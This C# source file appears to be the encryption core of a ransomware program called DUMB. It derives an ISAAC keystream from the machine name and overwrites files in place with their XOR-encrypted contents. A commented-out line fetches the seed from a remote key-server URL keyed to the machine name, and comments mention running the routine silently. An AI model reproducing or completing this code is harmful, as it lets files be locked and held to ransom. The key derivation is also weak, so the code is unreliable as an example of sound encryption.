using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace DUMB
{
    public class Crypt
    {
        public const int TUMBLE = 3; //Tumble ISAAC this many times before and after injecting the seed
        public static ISAAC PrepareKey()
        {
            try
            {
                string seed;
                //using (WebClient w = new WebClient()) seed = w.DownloadString("http://someshittydomain.info/?getseed=" + Environment.MachineName);
                seed = Environment.MachineName;

                byte[] realseed = Encoding.UTF8.GetBytes(seed);

                ISAAC csprng = new ISAAC();

                for (int i = 0; i < TUMBLE; i++)
                    csprng.Isaac(); //Why not?

                for (int i = 0; i < realseed.Length; i++)
                    csprng.mem[i] = realseed[i]; //Inject the seed into Isaac

                StringBuilder b = new StringBuilder(seed.Length);
                for (int i = 0; i < seed.Length; i++) b.Append(' ');
                seed = b.ToString(); //Zero-out seed

                for (int i = 0; i < realseed.Length; i++) realseed[i] = 0; //Zero-out readseed

                seed = null; realseed = null; //Push out of scope for GC

                for (int i = 0; i < TUMBLE; i++)
                    csprng.Isaac(); //Some more tumbling

                return csprng;
            }
            catch (WebException) { MessageBox.Show("Key server unavailable.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error); return null; }
            catch { return null; }
        }

        //XOR works both ways, so we don't need one function for Encrypting and one function for Decrypting, they're both the same thing for XORing
        public static void CryptFile(ISAAC csprng, byte[] subkey, string loc) 
        {
            FileStream s = null;
            int[] oldmem = null;
            try
            {
                s = File.Open(loc, FileMode.Open, FileAccess.ReadWrite, FileShare.None);

                oldmem = new int[ISAAC.SIZE];
                for (int i = 0; i < ISAAC.SIZE; i++) oldmem[i] = csprng.mem[i]; //Fast copy

                for (int i = 0; i < subkey.Length; i++)
                    csprng.mem[i] ^= subkey[i];

                byte[] buffer = new byte[ISAAC.SIZE];
                int read = s.Read(buffer, 0, ISAAC.SIZE);
                do
                {
                    csprng.Isaac();

                    for (int i = 0; i < read; i++)
                        buffer[i] = (byte)((buffer[i] ^ csprng.rsl[i]) % 256);

                    s.Seek(-read, SeekOrigin.Current);
                    s.Write(buffer, 0, read);
                } while ((read = s.Read(buffer, 0, ISAAC.SIZE)) > 0);
            }
            catch (UnauthorizedAccessException) { return; } //Fixes crashes on files with the readonly attribute
            //catch { return; } //If you were to actually use this silently, however this can actually fuck up decryption bad so this will never be used.
            finally
            {
                if (s != null)
                {
                    s.Close();
                    s.Dispose();
                }
                if (oldmem != null)
                {
                    csprng.mem = oldmem;
                    csprng.Isaac();
                }
            }
        }
    }
}
